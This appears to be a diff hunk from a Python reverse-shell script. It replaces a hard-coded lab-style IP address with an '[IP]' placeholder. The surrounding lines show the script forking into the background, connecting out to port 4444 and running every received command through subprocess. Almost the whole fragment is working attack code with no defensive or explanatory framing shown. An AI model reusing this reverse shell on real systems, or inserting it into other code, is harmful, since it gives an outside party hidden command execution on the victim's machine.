@@ -198,7 +198,7 @@ if os.fork() != 0:
     exit()
 
 s=socket.socket()
-s.connect(("10.10.14.156",4444))
+s.connect(("[IP]",4444))
 while True:
     cmd=s.recv(1024).decode()
     out=subprocess.getoutput(cmd)
